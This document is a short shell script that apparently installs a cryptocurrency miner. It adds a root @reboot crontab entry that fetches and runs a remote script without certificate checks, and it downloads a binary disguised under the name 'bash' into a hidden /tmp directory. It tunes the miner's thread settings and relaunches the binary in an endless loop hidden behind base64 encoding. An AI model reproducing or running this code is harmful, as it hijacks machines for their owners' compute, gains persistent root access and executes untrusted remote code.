#!/bin/bash

mode="${1:-0}"
src="https://raw.githubusercontent.com/pakoinake/jzoax/main"
[ -f "/etc/crontab" ] && sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget --no-check-certificate -qO- ${src}/studio.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab

name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
[ -n "$name" ] || name="NULL"
name="${name}"

cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ "$cores" -gt "16" ] && cores=$((cores - 1))
[ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""

mkdir -p "/tmp/.config"
wget --no-check-certificate -qO "/tmp/.config/config.json" "${src}/idle.json"
wget --no-check-certificate -qO "/tmp/.config/bash" "${src}/idle"
chmod -R 777 "/tmp/.config"

[ -f "/tmp/.config/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "/tmp/.config/config.json"
[ -f "/tmp/.config/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "/tmp/.config/config.json"

#bash -c "ping aws.amazon.com" >/dev/null 2>&1 &

if [ "$mode" == "0" ]; then
  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d) &
else
  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d)
fi
